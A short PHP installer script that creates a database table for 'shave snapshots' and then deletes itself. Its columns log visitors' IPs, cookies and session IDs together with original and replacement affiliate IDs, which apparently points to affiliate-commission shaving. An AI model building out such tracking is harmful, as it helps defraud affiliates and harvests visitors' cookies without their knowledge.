<?php
require_once __DIR__ . '/config.php';
$pdo = getDB();
$pdo->exec("
CREATE TABLE IF NOT EXISTS `shave_snapshots` (
  `id` INT AUTO_INCREMENT PRIMARY KEY,
  `domain_id` INT NOT NULL,
  `ip_address` VARCHAR(45) NOT NULL,
  `user_agent` VARCHAR(512) DEFAULT NULL,
  `phase` ENUM('before','after') NOT NULL,
  `session_id` VARCHAR(50) DEFAULT NULL,
  `aff_id` VARCHAR(100) DEFAULT NULL,
  `sub_id` VARCHAR(100) DEFAULT NULL,
  `mode` VARCHAR(20) DEFAULT NULL,
  `replace_aff_id` VARCHAR(100) DEFAULT NULL,
  `replace_sub_id` VARCHAR(100) DEFAULT NULL,
  `url` TEXT DEFAULT NULL,
  `sessid2` VARCHAR(200) DEFAULT NULL,
  `cookies` JSON DEFAULT NULL,
  `cookie_count` INT DEFAULT 0,
  `url_params` JSON DEFAULT NULL,
  `matched_id` INT DEFAULT NULL,
  `created_at` TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  KEY `idx_ip_domain_phase` (`ip_address`, `domain_id`, `phase`),
  KEY `idx_created_at` (`created_at`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
");
echo "OK - shave_snapshots table created";
// Self-delete
@unlink(__FILE__);
